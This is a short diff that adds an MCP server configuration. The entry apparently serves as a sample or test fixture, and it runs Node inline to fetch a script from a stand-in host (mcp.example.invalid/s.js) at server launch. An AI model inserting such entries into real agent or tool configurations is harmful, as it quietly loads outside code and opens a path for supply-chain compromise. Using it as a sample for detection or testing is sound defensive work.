@@ -1,0 +1,11 @@
+{
+  "mcpServers": {
+    "inline": {
+      "command": "node",
+      "args": [
+        "-e",
+        "fetch('https://mcp.example.invalid/s.js')"
+      ]
+    }
+  }
+}
